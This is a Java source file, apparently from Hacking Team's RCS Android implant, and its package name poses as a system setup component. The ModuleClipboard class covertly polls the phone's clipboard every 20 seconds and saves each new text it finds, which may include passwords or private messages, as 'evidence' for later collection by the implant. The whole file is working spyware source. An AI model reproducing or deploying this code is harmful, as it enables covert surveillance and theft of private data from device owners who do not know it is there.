/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : AgentClipboard.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.syssetup.module;

import java.util.ArrayList;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import android.text.ClipboardManager;

import com.android.syssetup.Status;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.conf.ConfModule;
import com.android.syssetup.evidence.EvidenceBuilder;
import com.android.syssetup.evidence.EvidenceType;
import com.android.syssetup.interfaces.IncrementalLog;
import com.android.syssetup.util.ByteArray;
import com.android.syssetup.util.Check;
import com.android.syssetup.util.DateTime;
import com.android.syssetup.util.WChar;


public class ModuleClipboard extends BaseModule implements IncrementalLog {

	private static final String TAG = "ModuleClipboard"; //$NON-NLS-1$

	ClipboardManager clipboardManager;
	static String lastClip = ""; //$NON-NLS-1$

	@Override
	public void actualStart() {

	}

	@Override
	public void actualStop() {
		clipboardManager = null;
	}

	@Override
	public boolean parse(ConfModule conf) {
		setPeriod(20000);
		return true;
	}

	@Override
	public void actualGo() {
		//ASG gui = Status.getAppGui();
		Handler mHandler = new Handler(Looper.getMainLooper());
		mHandler.post(new Runnable() {
			@Override
			public void run() {
				if (Cfg.DEBUG) {
					Check.log(TAG + " (run) fireAdminIntent");
				}

				getClipboard();
			}
		});
	}
	
	private void getClipboard() {
		String ret = null;
		
		clipboardManager = (ClipboardManager) Status.getAppContext().getSystemService(Context.CLIPBOARD_SERVICE);
		
		if (Cfg.DEBUG) {
			Check.ensures(clipboardManager != null, "Null clipboard manager"); //$NON-NLS-1$
		}
		
		if (clipboardManager == null) {
			return;
		}
		
		CharSequence cs = clipboardManager.getText();
		
		if (cs == null)
			return;
		
		ret = cs.toString();
		
		if (ret != null && !ret.equals(lastClip)) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " (go): captured " + ret);//$NON-NLS-1$
			}
			
			// Questo log non e' piu incrementale
			saveEvidence(ret);
			
			lastClip = ret;
		}
	}

	private void saveEvidence(String ret) {
		final byte[] tm = (new DateTime()).getStructTm();
		final byte[] payload = WChar.getBytes(ret.toString(), true);
		final byte[] process = WChar.getBytes("", true); //$NON-NLS-1$
		final byte[] window = WChar.getBytes("", true); //$NON-NLS-1$
		final ArrayList<byte[]> items = new ArrayList<byte[]>();
		
		EvidenceBuilder evidence;
		
		synchronized (this) {
			evidence = new EvidenceBuilder(EvidenceType.CLIPBOARD);
		}
		
		items.add(tm);
		items.add(process);
		items.add(window);
		items.add(payload);
		items.add(ByteArray.intToByteArray(EvidenceBuilder.E_DELIMITER));

		if (Cfg.DEBUG) {
			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
		}
		
		synchronized (this) {
			evidence.write(items);
			evidence.close();
		}
	}

	public synchronized void resetLog() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " (resetLog)");
		}

		// Do nothing, this log is not incremental anymore
	}

}
